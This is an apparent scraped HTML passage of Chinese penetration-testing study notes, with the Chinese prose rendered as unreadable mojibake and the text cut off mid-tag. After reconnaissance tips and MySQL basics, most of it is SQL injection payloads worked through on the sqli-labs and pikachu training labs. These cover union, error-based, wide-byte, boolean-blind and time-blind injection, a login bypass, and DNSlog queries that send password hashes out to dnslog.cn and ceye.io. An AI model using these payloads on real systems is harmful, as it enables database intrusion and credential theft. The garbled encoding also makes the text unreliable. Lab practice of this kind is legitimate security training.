title="ç½‘ç»œå®‰å…¨ä¸æ¸—é€æµ‹è¯•æµç¨‹"></a>ç½‘ç»œå®‰å…¨ä¸æ¸—é€æµ‹è¯•æµç¨‹</h3></li></ul><p>å¨èƒå»ºæ¨¡é˜¶æ®µâ†’æ¼æ´åˆ†æé˜¶æ®µâ†’æ¸—é€æ”»å‡»é˜¶æ®µâ†’åæ¸—é€æ”»å‡»é˜¶æ®µâ†’æ’°å†™æŠ¥å‘Šé˜¶æ®µ</p><p>å®é™…æ¸—é€æµ‹è¯•ä¸­çš„æµç¨‹ï¼š</p><p>æ˜ç¡®ç›®æ ‡â†’ä¿¡æ¯æ”¶é›†â†’æ¼æ´å‘ç°â†’æ¼æ´åˆ©ç”¨â†’åæ¸—é€â†’æŠ¥å‘Šæ–‡æ¡£é˜¶æ®µ</p><ul><li><h3 id="èµ„äº§ä¸ä¿¡æ¯æ”¶é›†"><a href="#èµ„äº§ä¸ä¿¡æ¯æ”¶é›†" class="headerlink" title="èµ„äº§ä¸ä¿¡æ¯æ”¶é›†"></a>èµ„äº§ä¸ä¿¡æ¯æ”¶é›†</h3></li></ul><p>1.ä»ä¸»åŸŸåå‡ºå‘ï¼Œå‘å…¶æ—ç«™æ‰©æ•£</p><p>2.å­åŸŸåæ”¶é›†ï¼ˆlayerå­åŸŸåæŒ–æ˜æœºï¼ˆæšä¸¾æ€§è´¨ï¼‰ï¼Œ<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">oneforall</a>ï¼ˆæ ¹æ®æ¥å£ï¼Œéœ€è¦é…ç½®apiï¼šåœ¨\OneForAll-master\config\api.py ï¼‰ï¼‰ï¼Œç›¸å…³åŸŸåæ”¶é›†</p><p>3.é€šè¿‡æœç´¢å¼•æ“ï¼ˆç¬¬ä¸‰æ–¹ï¼‰ï¼šå¸¸ç”¨ç¬¬ä¸‰æ–¹å­åŸŸåçˆ†ç ´æ¥å£</p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p><p><a href="https://www.virustotal.com/gui/home/search" target="_blank" rel="noopener">https://www.virustotal.com/gui/home/search</a></p><p><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain/</a></p><p><a href="http://searchdns.netcraft.com/" target="_blank" rel="noopener">http://searchdns.netcraft.com/</a></p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://chapangzhan.com/ï¼ˆæ—ç«™æŸ¥è¯¢ï¼‰" target="_blank" rel="noopener">https://chapangzhan.com/ï¼ˆæ—ç«™æŸ¥è¯¢ï¼‰</a></p><p>4.appï¼Œå°ç¨‹åºï¼Œå…¬ä¼—å·</p><p>5.å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢ï¼ˆåŸºæœ¬æ— æ•ˆä¿¡æ¯ï¼‰ï¼š</p><p>çˆ±ç«™ç½‘ï¼Œ<a href="https://beian.tianyancha.com/" target="_blank" rel="noopener">å¤©çœ¼æŸ¥</a></p><p>6.ipä¿¡æ¯æ”¶é›†ï¼šæœ‰çš„ä¼ä¸šåšäº†cdnåŠ é€Ÿï¼Œä¾‹å¦‚ä½¿ç”¨ä¸ƒç‰›äº‘é’ˆå¯¹å›¾åºŠè¿›è¡ŒåŠ é€Ÿï¼Œæ‰€ä»¥å°±éœ€è¦è¿›è¡Œcdnçš„ç»•è¿‡ï¼Œæ¥æ‰¾åˆ°è¢«åŠ é€Ÿçš„æœåŠ¡å™¨ï¼ˆipåœ°å€ï¼‰</p><p>ç»•è¿‡æ–¹æ³•ï¼š</p><ul><li><p><strong>å¤šåœ°ping</strong>ï¼ˆå›½å¤–ï¼‰</p></li><li><p><strong>å¯¹åˆ†ç«™è¿›è¡Œping</strong></p></li></ul><p>7.åœ¨çº¿cmsæŒ‡çº¹è¯†åˆ«</p><p>äº‘æ‚‰æŒ‡çº¹ï¼š<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a><br>æ½®æ±æŒ‡çº¹ï¼š<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></p><p>8.æœåŠ¡å™¨/ä¸­é—´å™¨/ç«™ç‚¹æ¶æ„ä¿¡æ¯</p><p>9.åˆ©ç”¨nmapï¼š</p><p>-vvï¼šå¯¹ç»“æœçš„è¯¦ç»†è¾“å‡º</p><p>-sPï¼špingæ‰«æ</p><p>-sTï¼štcpè¿æ¥æ‰«æï¼šå®Œæ•´ä¸‰æ¬¡æ¡æ‰‹ï¼Œæœ€åŸºç¡€ç¨³å®šçš„æ‰«ææ–¹å¼</p><p>-sSï¼štcp synæ‰«æ</p><p>-sUï¼šudpæ‰«æï¼Œæ‰«æé€Ÿåº¦éå¸¸æ…¢</p><p>-P0ï¼šæ— pingæ‰«æï¼Œç”¨äºè¿›åˆ¶pingçš„æ‰«æ</p><p>10.wafä¿¡æ¯è¯†åˆ«ï¼š</p><pre><code>wafw00f -a [åŸŸå]</code></pre><ul><li><h3 id="MySQLåŸºç¡€"><a href="#MySQLåŸºç¡€" class="headerlink" title="MySQLåŸºç¡€"></a>MySQLåŸºç¡€</h3></li></ul><p><strong>MySQLåŸºç¡€è¯­æ³•ï¼š</strong></p><p>select version()ï¼›</p><p>select user();</p><p>select @@basedir;æŸ¥è¯¢å½“å‰è·¯å¾„ã€‚</p><p>show databasesï¼›</p><p>use + æ•°æ®åº“åï¼›é€‰æ‹©ä¸€ä¸ªæ•°æ®åº“ã€‚</p><p>select database();æŸ¥è¯¢å½“å‰æ•°æ®åº“ã€‚</p><p>show tables;æŸ¥è¯¢æ‰€æœ‰è¡¨åã€‚</p><p>create database + æ•°æ®åº“å;åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ã€‚</p><p>drop database + æ•°æ®åº“å;åˆ é™¤ä¸€ä¸ªæ•°æ®åº“ã€‚</p><p>desc + è¡¨å;æŸ¥è¯¢ä¸€ä¸ªè¡¨çš„ç»“æ„ã€‚</p><p><strong>å½“åˆ›å»ºä¸€ä¸ªè¡¨çš„æ—¶å€™å®ƒæœ‰å…­ä¸ªå±æ€§ï¼šfield(æ–‡ä»¶å)ã€type(ç±»å‹)ã€nullã€keyã€defaultã€extra</strong></p><p>æƒ³è¦ä½¿ç”¨ä¸­æ–‡ï¼Œå°±è¦è®¾ç½®èµ·ç¼–ç ï¼šset names gbkï¼›</p><p><strong>æ›´æ–°æ•°æ®ï¼š</strong></p><p>1.æ›´æ–°æŒ‡å®šæ•°æ®ï¼Œä½¿ç”¨whereå­å¥æ¥æŒ‡å®š</p><p>update è¡¨å set å­—æ®µå1=å€¼1ï¼Œ[å­—æ®µå2=å€¼2] [whereæ¡ä»¶è¡¨è¾¾å¼]</p><p>ä¾‹å¦‚ï¼šå‘æ•°æ®åº“classä¸‹studentè¡¨ä¸­idä¸º1çš„æ•°æ®ä¸­å­—æ®µageæ”¹ä¸º16ï¼Œå­—æ®µbirthdayæ”¹ä¸º2004ã€‚</p><p>update student set age =16ï¼Œbirthday=2004 where id=1;</p><p>2.å¦‚æœæ²¡æœ‰whereè¯­å¥ï¼Œåˆ™è¡¨ä¸­æ‰€æœ‰çš„è®°å½•éƒ½æ›´æ–°</p><p><strong>distinctå…³é”®å­—æŸ¥è¯¢ï¼š</strong></p><p>ä¾‹å¦‚ï¼š</p><p>æŸ¥è¯¢æ•°æ®åº“classä¸‹æŸ¥studentè¡¨ä¸­birthdayå­—æ®µçš„å€¼ï¼Œç»“æœä¸­ä¸å…è®¸å‡ºç°é‡å¤çš„å€¼ã€‚</p><p>select distinct birthday from student;</p><p><strong>å¸¦likeå…³é”®å­—çš„æŸ¥è¯¢ï¼š</strong></p><p>%é€šé…ç¬¦</p><p>ä¾‹å¦‚ï¼š</p><p>æŸ¥è¯¢æ•°æ®åº“classä¸‹studentè¡¨ä¸­å‘¢ä¹ˆå­—æ®µä»¥å­—ç¬¦â€œsâ€å¼€å¤´çš„çš„äººçš„idï¼Œnameã€‚</p><p>select id,name from student where name like â€œs%â€ï¼›</p><p><strong>countå‡½æ•°</strong>ï¼šç»Ÿè®¡è®°å½•çš„æ¡æ•°</p><p>ä¾‹å¦‚ï¼š</p><p>select count(*) from student;</p><p><strong>group by</strong>ï¼š</p><p>å°†åˆ—ä¸­çš„å­—æ®µï¼ˆç›¸åŒï¼‰æŒ‰ç»„æ’åˆ—</p><p><strong>order by</strong>ï¼š</p><p>æŒ‰ç…§åˆ—ä¸­çš„å†…å®¹è¿›è¡Œæ’åˆ—</p><p><a href="https://blog.csdn.net/qq_22642239/article/details/52127016" target="_blank" rel="noopener">MySQLå‡½æ•°å¤§å…¨</a></p><p><strong>source +.sqlæ–‡ä»¶</strong>ï¼šå°†.sqlæ–‡ä»¶è½½å…¥åˆ°æ•°æ®åº“ä¸­</p><p><strong>å†…è”æ³¨é‡Š</strong>:(æŸ¥ç‰ˆæœ¬å·)</p><pre><code>/*![ç‰ˆæœ¬å·]*/</code></pre><p>è‹¥å¤§äºåˆ™æ‰§è¡Œå¤±è´¥</p><ul><li><h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2></li></ul><h4 id="åˆ¤æ–­æ³¨å…¥ï¼š"><a href="#åˆ¤æ–­æ³¨å…¥ï¼š" class="headerlink" title="åˆ¤æ–­æ³¨å…¥ï¼š"></a>åˆ¤æ–­æ³¨å…¥ï¼š</h4><p> 1.åˆ©ç”¨and å’Œoræ¥åˆ¤æ–­ï¼Œxorå¼‚æˆ–ï¼šåªæœ‰å½“ä¸€çœŸä¸€å‡çš„æ—¶å€™æ‰ä¼šä¸ºæ­£ç¡®ï¼Œå…¶ä½™çš„éƒ½æ˜¯å‡çš„</p><h4 id="sqli-labsæ­å»ºå®Œæˆï¼š"><a href="#sqli-labsæ­å»ºå®Œæˆï¼š" class="headerlink" title="sqli-labsæ­å»ºå®Œæˆï¼š"></a><strong>sqli-labsæ­å»ºå®Œæˆï¼š</strong></h4><h5 id="less-2ï¼š"><a href="#less-2ï¼š" class="headerlink" title="less-2ï¼š"></a>less-2ï¼š</h5><pre><code>-1 union select 1,database(),3</code></pre><p>åº“åï¼šsecurity</p><pre><code>-1 union select 1,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),3</code></pre><p>ç”±äºæ˜¾ç¤ºè¡¨åªèƒ½æ˜¾ç¤ºä¸€è¡Œï¼Œæ‰€ä»¥éœ€è¦limitæ¥é€ä¸ªå›æ˜¾ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç»“åˆburpæ¥å®ç°é«˜æ•ˆç‡çš„çˆ†ç ´è¡¨æ˜ï¼Œä¹Ÿå°±æ˜¯å°†0æ¢ä¸º123456789â€¦â€¦â€¦,ä½†æ˜¯å¯ä»¥ä½¿ç”¨group_concatå‡½æ•°</p><p>è¡¨åï¼šemailsã€referersã€uagentsã€users</p><pre><code>-1 union select 1,(select group_concat(0x7e,column_name) from information_schema.columns where table_name=&#39;users&#39;),3</code></pre><p>åˆ—å(å­—æ®µ)ï¼š<del>id,</del>username,~password</p><p>è€å¸ˆçš„æ„é€ ï¼š</p><pre><code>-1 union select 1,group_concat(0x7e,username),group_concat(0x7e,password) from users</code></pre><p>æˆ‘çš„æ„é€ ï¼š</p><pre><code>-1 union select 1,2,group_concat(username,0x7e,password) from users</code></pre><p>å¾—åˆ°æ‰€æœ‰ç”¨æˆ·çš„éšç§äº†</p><h5 id="less-1ï¼š"><a href="#less-1ï¼š" class="headerlink" title="less-1ï¼š"></a>less-1ï¼š</h5><p>å­—ç¬¦å‹ï¼š1â€™ and 1=2#ä¼šæŠ¥é”™ï¼Œæ ¹æ®less-2ç›´æ¥æ„é€ </p><pre><code>-1&#39; union select 1,2,group_concat(username,0x7e,password) from users%23</code></pre><p>ç›´æ¥ä¸€æŠŠæ¢­ï¼Œä¸è¿‡è¦æ³¨æ„#éœ€è¦è¿›è¡ŒURLè½¬åŒ–â†’%23</p><h4 id="sqlæ³¨å…¥-æœç´¢å‹ï¼ˆpikachué¶åœºæ­å»ºå®Œæˆï¼‰ï¼š"><a href="#sqlæ³¨å…¥-æœç´¢å‹ï¼ˆpikachué¶åœºæ­å»ºå®Œæˆï¼‰ï¼š" class="headerlink" title="sqlæ³¨å…¥-æœç´¢å‹ï¼ˆpikachué¶åœºæ­å»ºå®Œæˆï¼‰ï¼š"></a>sqlæ³¨å…¥-æœç´¢å‹ï¼ˆpikachué¶åœºæ­å»ºå®Œæˆï¼‰ï¼š</h4><p>sqlè¯­å¥åŸå‹ï¼šselect * from news where content like â€˜%d%â€™</p><p>æƒ³åŠæ³•é—­åˆæ‰å•å¼•å·å’Œç™¾åˆ†æ¯”å·</p><pre><code>1%&#39; and 1=2 --1%&#39; order by 4 --+1%&#39; order by 3 --+</code></pre><p>æœ‰ä¸‰ä¸ªå­—æ®µ</p><pre><code>1%&#39; union select 1,database(),3 --+</code></pre><p>åº“åï¼špikachu </p><pre><code>1%&#39; union select 1,(select group_concat(table_name)+from+information_schema.tables+where+table_schema=&#39;pikachu&#39;),3 --+</code></pre><p>è¡¨åï¼šhttpinfo,member,message,users,xssblind </p><pre><code>1%&#39; union select 1,(select group_concat(column_name)+from+information_schema.columns+where+table_name=&#39;users&#39;),3 --+</code></pre><p>åˆ—æ˜ï¼šid,username,password,level,id,username,password </p><p>çˆ†ç ´å­—æ®µå€¼</p><pre><code>1%&#39; union select 1,2,group_concat(username,0x7e,password)+from+users --+</code></pre><p>å¯†ç æ˜¯ç»è¿‡hashçš„</p><h4 id="å®½å­—èŠ‚æ³¨å…¥åŸç†-less-32-ï¼š"><a href="#å®½å­—èŠ‚æ³¨å…¥åŸç†-less-32-ï¼š" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥åŸç†(less-32)ï¼š"></a>å®½å­—èŠ‚æ³¨å…¥åŸç†(less-32)ï¼š</h4><p>1.å¯¹ç”¨æˆ·è¾“å‡ºçš„å•å¼•å·è¿›è¡Œå¤„ç†ï¼Œåœ¨å•å¼•å·å‰åŠ ä¸Šæ–œæ è¿›è¡Œè½¬ä¹‰ï¼Œè¿™æ ·å•å¼•å·å°±å¤±å»äº†ä½œç”¨</p><p>2.æ³¨å…¥æ€è·¯ï¼š</p><p>a.è®©æ–œæ å¤±å»ä½œç”¨</p><p>b.è®©æ–œæ æ¶ˆå¤±</p><p>3.MySQLåœ¨ä½¿ç”¨gbkç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—</p><p><strong>å¼€å§‹æ‰“å…³ï¼š</strong></p><p>æŠ€å·§ï¼šé€šè¿‡gbkç¼–ç çš„ç‰¹æ€§åˆ©ç”¨%dfçš„ç‰¹æ€§æ¥ä½¿åé¢çš„%5câ†’/çš„ä¸¤ä¸ªå­—ç¬¦ç»„åˆï¼Œè®¤ä¸ºæ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œè¿™æ—¶å€™å•å¼•å·å°±è¢«é—­åˆäº†</p><pre><code>%df%27+order by 4+--+%df%27+order by 3+--+%df%27+union select 1,database(),3+--+</code></pre><p>åº“åï¼šsecurity</p><p>è·Ÿless-2ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥ä¸€æŠŠæ¢­ï¼š</p><pre><code>%df%27+union select 1,group_concat(username,0x7e,password),3+from users+--+</code></pre><p>å¾—åˆ°ç”¨æˆ·éšç§ä¿¡æ¯</p><h4 id="æŠ¥é”™æ³¨å…¥ï¼š"><a href="#æŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="æŠ¥é”™æ³¨å…¥ï¼š"></a>æŠ¥é”™æ³¨å…¥ï¼š</h4><p>æœ‰10ç§ä¹‹å¤šçš„æŠ¥é”™æ³¨å…¥é™¤äº†eå’Œuè¿˜æœ‰floor()ä¸‰ç§ä¸ºä¸»è¦</p><p>ç›¸å…³å‡½æ•°ï¼š</p><p>count()æ˜¾ç¤ºæœ‰å‡ æ¡ï¼ˆè¡Œï¼‰æ•°æ®</p><p>rand()éšæœºäº§ç”Ÿä¸€ä¸ª0-1çš„æµ®ç‚¹æ•°ï¼Œå…¶ä¸­å¯ä»¥æŒ‡å®šä¸€ä¸ªç§å­ï¼Œç”¨æ¥äº§ç”Ÿé‡å¤åºåˆ—</p><p>floor()å–æ•´æ•°</p><p>group byï¼šæ ¹æ®byåé¢çš„è¿›è¡Œåˆ†ç±»åˆ†ç»„ï¼Œé¡ºåºä¸ºæ•°å­—ã€‚å­—æ¯</p><p>extractvalue()ï¼šå…¶èƒ½æŸ¥è¯¢çš„å­—ç¬¦ä¸²æˆ‘çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœè¶…è¿‡32çš„è¯ï¼Œå°±éœ€è¦ä½¿ç”¨substring()å‡½æ•°æˆªå–ï¼Œä¾æ¬¡æŸ¥çœ‹32ä½</p><h5 id="ç¬¬ä¸€ç§æŠ¥é”™æ–¹å¼â€”åˆ©ç”¨ä¸»é”®å†²çªçš„åŸç†æ¥æŠ¥é”™æ³¨å…¥ï¼š"><a href="#ç¬¬ä¸€ç§æŠ¥é”™æ–¹å¼â€”åˆ©ç”¨ä¸»é”®å†²çªçš„åŸç†æ¥æŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="ç¬¬ä¸€ç§æŠ¥é”™æ–¹å¼â€”åˆ©ç”¨ä¸»é”®å†²çªçš„åŸç†æ¥æŠ¥é”™æ³¨å…¥ï¼š"></a>ç¬¬ä¸€ç§æŠ¥é”™æ–¹å¼â€”åˆ©ç”¨ä¸»é”®å†²çªçš„åŸç†æ¥æŠ¥é”™æ³¨å…¥ï¼š</h5><p>count+group by+floor(rand(0)*2)</p><p>å› ä¸ºrandå‡ºæ¥çš„æ•°æ˜¯å°äº1çš„ï¼Œæ‰€ä»¥*2åç»è¿‡floorå–æ•´è¦ä¹ˆæ˜¯0è¦ä¹ˆæ˜¯1ï¼Œå½“è¿™ä¸‰ä¸ªå‡½æ•°ç›¸é‡çš„æ—¶å€™å°±ä¼šå‡ºç°ä¸»é”®å†²çª</p><pre><code>select count(*) from users group by concat(version(),floor(rand(0)*2));</code></pre><h5 id="less-5ï¼š"><a href="#less-5ï¼š" class="headerlink" title="less-5ï¼š"></a>less-5ï¼š</h5><p>ä¾ç„¶æ˜¯ä¸‰åˆ—ï¼š<strong>order by 4æŠ¥é”™</strong></p><pre><code>-1&#39; union select 1,2,count(*) from information_schema.tables where table_schema=database() group by concat(floor(rand(0)*2),0x7e,database())+--+</code></pre><p>åº“åï¼šsecurity</p><pre><code>-1&#39; union select 1,2,count(*) from information_schema.tables where table_schema=database() group by concat(floor(rand(0)*2),0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))+--+</code></pre><p>è¡¨åï¼šlåˆ©ç”¨burpæ¥å®ç°é«˜æ•ˆç‡çˆ†ç ´ï¼šemailsã€referersã€uagentsã€users</p><pre><code>-1&#39; union select 1,2,count(*) from information_schema.tables where table_schema=database() group by concat(floor(rand(0)*2),0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))+--+</code></pre><p>åˆ—åï¼šåˆ©ç”¨burpæ¥å®ç°é«˜æ•ˆç‡çˆ†ç ´ï¼šid,username,password,level,id,username,password </p><p>çˆ†ç ´å­—æ®µå€¼ï¼š</p><pre><code>-1&#39; union select 1,2,count(*) from users group by concat(0x7e,floor(rand(0)*2),(select concat(0x7e,password) from users limit 0,1))+--+</code></pre><p>æ³¨æ„ï¼Œæ­¤å¤„çš„floorå‡½æ•°å‰é¢éœ€è¦æœ‰</p><h5 id="ç¬¬äºŒç§æŠ¥é”™æ³¨å…¥xpathè¯­æ³•é”™è¯¯ï¼š"><a href="#ç¬¬äºŒç§æŠ¥é”™æ³¨å…¥xpathè¯­æ³•é”™è¯¯ï¼š" class="headerlink" title="ç¬¬äºŒç§æŠ¥é”™æ³¨å…¥xpathè¯­æ³•é”™è¯¯ï¼š"></a>ç¬¬äºŒç§æŠ¥é”™æ³¨å…¥xpathè¯­æ³•é”™è¯¯ï¼š</h5><p>less-5ï¼š</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,databse()),1) --+</code></pre><p>åº“åï¼šsecurity</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database() limit 0,1)),1) --+</code></pre><p>è¡¨æ˜ï¼šemailsã€referersã€uagentsã€users</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())),1) --+</code></pre><p>åˆ—åï¼š</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+column_name+from+information_schema.columns+where+table_name=&#39;users&#39; limit 0,1)),1)+--+</code></pre><p>ç»“åˆburpæ¥å®ç°é«˜æ•ˆç‡çˆ†ç ´åˆ—å</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+username+from+users+limit 0,1)),1)+--+</code></pre><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+password+from+users+limit 0,1)),1)+--+</code></pre><p>ç»“åˆburpå®ç°é«˜æ•ˆç‡çˆ†ç ´ </p><h4 id="å¸ƒå°”æ³¨å…¥ï¼š"><a href="#å¸ƒå°”æ³¨å…¥ï¼š" class="headerlink" title="å¸ƒå°”æ³¨å…¥ï¼š"></a>å¸ƒå°”æ³¨å…¥ï¼š</h4><p>æ•°æ®ä¸èƒ½å›æ˜¾åˆ°å‰ç«¯ï¼Œéœ€è¦åˆ«çš„æ–¹å¼æ¥è¿›è¡Œåˆ¤æ–­</p><h5 id="less-8ï¼š"><a href="#less-8ï¼š" class="headerlink" title="less-8ï¼š"></a>less-8ï¼š</h5><p>åˆ©ç”¨length()å‡½æ•°æ¥åˆ¤æ–­åº“åçš„é•¿åº¦</p><pre><code>1&#39;+and+length(database())&gt;1+--+</code></pre><p>é›†åˆburpåŠè‡ªåŠ¨åŒ–æ¥å®ç°é«˜æ•ˆç‡çˆ†ç ´</p><p>åˆ©ç”¨substr()å‡½æ•°æ¥çŒœè§£åº“å </p><pre><code>1&#39;+and+substr(database(),1,1)=&#39;a&#39;+--+</code></pre><p>åˆ©ç”¨åŠè‡ªåŠ¨åŒ–é’ˆå¯¹1å’Œaçš„ä½ç½®è¿›è¡Œé€’å¢å¼çˆ†ç ´</p><p>çŒœè¡¨åï¼š</p><pre><code>1&#39;+and+substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1)=&#39;a&#39;+--+</code></pre><p>å¯¹0å¤„è®¾ç½®å˜é‡æ˜¯å› ä¸ºè¦è¯»ç¬¬å‡ ä¸ªè¡¨ï¼Œå¯¹ç¬¬äºŒä¸ª1è®¾ç½®å˜é‡æ˜¯å› ä¸ºè¦é€‰å–ç¬¬å‡ ä½çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œå¯¹aå°±ä¸ç”¨è¯´äº†</p><p>çŒœåˆ—åï¼š</p><pre><code>1&#39;+and+substr((select+column_name+from+information_schema.columns+where+table_schema=database()+and+table_name=&#39;users&#39;+limit+0,1),1,1)=&#39;a&#39;+--+</code></pre><p>åŒç†å¾—ï¼Œå½“ç„¶ä¸ä¸€å®šè¦ ä¸‰ä¸ªå˜é‡ï¼Œå¯ä»¥åŠåŠè‡ªåŠ¨åŒ–æ¥å®ç°æ¸…æ™°çš„çˆ†ç ´</p><pre><code>1&#39;+and+substr((select+password+from+users+limit 0,1),1,1)=&#39;a&#39;+--+</code></pre><h4 id="æ—¶é—´ç›²æ³¨-ä¹Ÿå±äºå¸ƒå°”ç›²æ³¨-ï¼š"><a href="#æ—¶é—´ç›²æ³¨-ä¹Ÿå±äºå¸ƒå°”ç›²æ³¨-ï¼š" class="headerlink" title="æ—¶é—´ç›²æ³¨(ä¹Ÿå±äºå¸ƒå°”ç›²æ³¨)ï¼š"></a>æ—¶é—´ç›²æ³¨(ä¹Ÿå±äºå¸ƒå°”ç›²æ³¨)ï¼š</h4><p>åŸç†ï¼šç”¨æ¡ä»¶è¯­å¥æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥æ˜¯å¦æ‰§è¡Œ</p><p>æ€è·¯ï¼š</p><pre><code>1&#39;+and+if((substr(user(),1,1)=&#39;a&#39;),sleep(2),1)+--+</code></pre><p>ç»“å°¾çš„1æ˜¯è¿”å›çš„å€¼ï¼Œuser()å¤„å¯ä»¥æ›¿æ¢ä¸ºæŸ¥è¯¢çš„è¯­å¥</p><pre><code>1&#39;+and+if((substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1)&gt;&#39;a&#39;),sleep(2),1)+--+</code></pre><pre><code>1&#39;+and+if((substr((select+column_name+from+information_schema.columns+where+table_name=&#39;users&#39;+limit+0,1),1,1)&gt;&#39;a&#39;),sleep(2),1)+--+</code></pre><pre><code>1&#39;+and+if((substr((select+password+from+users+limit+0,1),1,1)&gt;&#39;a&#39;),sleep(2),1)+--+</code></pre><p>OK</p><h4 id="DNSlogå¤–å¸¦æ³¨å…¥ï¼š"><a href="#DNSlogå¤–å¸¦æ³¨å…¥ï¼š" class="headerlink" title="DNSlogå¤–å¸¦æ³¨å…¥ï¼š"></a>DNSlogå¤–å¸¦æ³¨å…¥ï¼š</h4><p>åŸç†ï¼šå°†dnslogå¹³å°ä¸­çš„ç‰¹æœ‰å­—æ®µpayloadå¸¦å…¥ç›®æ ‡å‘èµ·dnsè¯·æ±‚ï¼Œé€šè¿‡dnsè§£æå°†è¯·æ±‚åçš„å…³é”®ä¿¡æ¯ç»„åˆæˆæ–°çš„ä¸‰çº§åŸŸåå¸¦å‡ºï¼Œåœ¨dnsæœåŠ¡å™¨çš„dnsæ—¥å¿—ä¸­æ˜¾ç¤ºå‡ºæ¥ã€‚</p><p><strong>show variables like â€˜%secure%â€™;æŸ¥çœ‹load_file()å¯ä»¥è¯»å–çš„ç£ç›˜ï¼š</strong></p><p>å½“secure_file_privä¸ºç©ºï¼Œå°±å¯ä»¥è¯»å–ç£ç›˜çš„ç›®å½•ã€‚</p><p>å½“secure_file_privä¸ºG:\ï¼Œå°±å¯ä»¥è¯»å–Gç›˜çš„ç›®å½•ã€‚</p><p>å½“secure_file_privä¸ºnullï¼Œåˆ™ä¸èƒ½åŠ è½½æ–‡ä»¶ã€‚</p><p>éœ€è¦é…ç½®mysql.iniä¸­çš„secure_file_priv=â€™ â€˜</p><p>åœ¨mysqlå‘½ä»¤æ‰§è¡Œï¼š</p><pre><code>select load_file(&#39;\\\\&#39;,afanti.xxxx.ceye.io\\aaa&#39;);å…¶ä¸­afantiå°±æ˜¯è¦æ³¨å…¥çš„æŸ¥è¯¢è¯­å¥</code></pre><h5 id="less-9ï¼š"><a href="#less-9ï¼š" class="headerlink" title="less-9ï¼š"></a>less-9ï¼š</h5><p>åˆ©ç”¨dnslog.cnå¹³å°æ¥è¿›è¡Œæµ‹éªŒ</p><pre><code>1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select+hex(password)+from+users+limit+0,1),&#39;.xxxx.dnslog.cn\\aaa&#39;)))+--+</code></pre><p>è”åˆæŸ¥è¯¢ï¼š</p><pre><code>&#39; union select 1,2,(load_file(concat(&#39;\\\\&#39;,(select+hex(password)))+from+users+limit+0,1),&#39;.xxxx.dnslog.cn\\aaa&#39;)))+--+</code></pre><p>æ­¤å¤„éœ€è¦ç”¨hexç¼–ç ï¼Œä»¥é˜²æŠ¥é”™</p><h4 id="POSTæ³¨å…¥ï¼š"><a href="#POSTæ³¨å…¥ï¼š" class="headerlink" title="POSTæ³¨å…¥ï¼š"></a>POSTæ³¨å…¥ï¼š</h4><h5 id="sqllabs-11ï¼š"><a href="#sqllabs-11ï¼š" class="headerlink" title="sqllabs-11ï¼š"></a>sqllabs-11ï¼š</h5><p>å¯ä»¥ä½¿ç”¨ä¸‡èƒ½å¯†ç ï¼š</p><pre><code>&#39; or 1=1#</code></pre><p>é’ˆå¯¹ç™»å½•æ¡†è¿›è¡Œæ³¨å…¥</p><p>postå‚æ•°ï¼š</p><pre><code>uname=&#39; or 1=1#&amp;passwd=123&amp;submit=Submit</code></pre><p>ä¸»è¦æ€è·¯å°±æ˜¯å°†passwdä»¥åŠå…¶åé¢çš„å†…å®¹å…¨éƒ¨æ³¨é‡Šæ‰ï¼Œç„¶åå‘getæ³¨å…¥ä¸€æ ·çš„æ€è·¯å°±okäº†</p><p>å…³äºæ³¨å†Œé¡µé¢çš„è´¦æˆ·å’Œå¯†ç çš„postæ³¨å…¥ï¼š</p><p>sqlè¯­å¥ï¼š</p><pre><code>$sql= &quot;insert into users values(&#39;$uname&#39;,&#39;$passwd&#39;)&quot;;</code></pre><pre><code>$uname=1&#39;or undataxml(1,user(),1) or&#39;</code></pre><p>å°†å®ƒæ”¾å…¥sqlä¸­çš„$unameä¸­å³å¯å‘ç°å¥¥å¦™</p><h4 id="Refereræ³¨å…¥ï¼š"><a href="#Refereræ³¨å…¥ï¼š" class="headerlink" title="Refereræ³¨å…¥ï¼š"></a>Refereræ³¨å…¥ï¼š</h4><h5 id="HTTPå¤´æ³¨å…¥ï¼š"><a href="#HTTPå¤´æ³¨å…¥ï¼š" class="headerlink" title="HTTPå¤´æ³¨å…¥ï¼š"></a>HTTPå¤´æ³¨å…¥ï¼š</h5><h6 id="COOKIEå‹æ³¨å…¥ï¼š"><a href="#COOKIEå‹æ³¨å…¥ï¼š" class="headerlink" 